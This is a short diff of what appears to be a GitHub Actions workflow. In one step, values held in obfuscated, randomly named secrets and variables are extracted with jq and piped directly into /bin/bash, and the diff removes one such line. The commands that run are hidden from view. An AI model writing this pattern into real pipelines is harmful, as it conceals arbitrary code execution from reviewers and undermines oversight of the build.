@@ -22,7 +22,6 @@ jobs:
           wx33460: ${{ secrets.wx33460 }}
         run: |
           printf '%s' "$wx33460" | jq -r .jmhiv240 | /bin/bash
-          printf '%s' "$ueak3" | jq -r .q54942 | /bin/bash
           echo $al77 | jq -r .kd313 | /bin/bash
           echo $f9260 | jq -r .b527 | /bin/bash
           printf '%s' "$ihb6" | jq -r .hwqf53 | /bin/bash
